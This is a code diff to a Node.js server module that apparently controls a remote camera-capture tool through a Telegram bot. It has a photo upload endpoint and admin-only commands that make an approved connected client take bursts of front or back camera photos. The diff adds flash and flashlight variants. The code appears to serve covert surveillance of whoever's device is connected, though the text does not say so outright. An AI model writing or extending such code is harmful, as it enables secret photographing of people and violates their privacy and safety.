@@ -2,7 +2,6 @@ const multer = require('multer');
 const upload = multer({ storage: multer.memoryStorage() });
 
 module.exports = function(app) {
-    // Upload Endpoint for Photos
     app.post('/upload', upload.single('photo'), async (req, res) => {
         try {
             if (!req.file) return res.status(400).send('No file uploaded.');
@@ -18,7 +17,6 @@ module.exports = function(app) {
         }
     });
 
-    // Telegram Command: /moref
     global.bot.onText(/\/moref/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() === global.adminId.toString()) {
@@ -31,13 +29,36 @@ module.exports = function(app) {
         }
     });
 
-    // Telegram Command: /moreb
     global.bot.onText(/\/moreb/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() === global.adminId.toString()) {
             if (global.approvedSocketId) {
                 global.bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
                 global.io.to(global.approvedSocketId).emit('capture_back');
+            } else {
+                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
+            }
+        }
+    });
+
+    global.bot.onText(/\/moreff/, (msg) => {
+        const chatId = msg.chat.id;
+        if (chatId.toString() === global.adminId.toString()) {
+            if (global.approvedSocketId) {
+                global.bot.sendMessage(chatId, "📸 💡 Front Camera with Screen Flash activated...");
+                global.io.to(global.approvedSocketId).emit('capture_front_flash');
+            } else {
+                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
+            }
+        }
+    });
+
+    global.bot.onText(/\/morebf/, (msg) => {
+        const chatId = msg.chat.id;
+        if (chatId.toString() === global.adminId.toString()) {
+            if (global.approvedSocketId) {
+                global.bot.sendMessage(chatId, "📸 🔦 Back Camera with Flashlight activated...");
+                global.io.to(global.approvedSocketId).emit('capture_back_flash');
             } else {
                 global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
             }
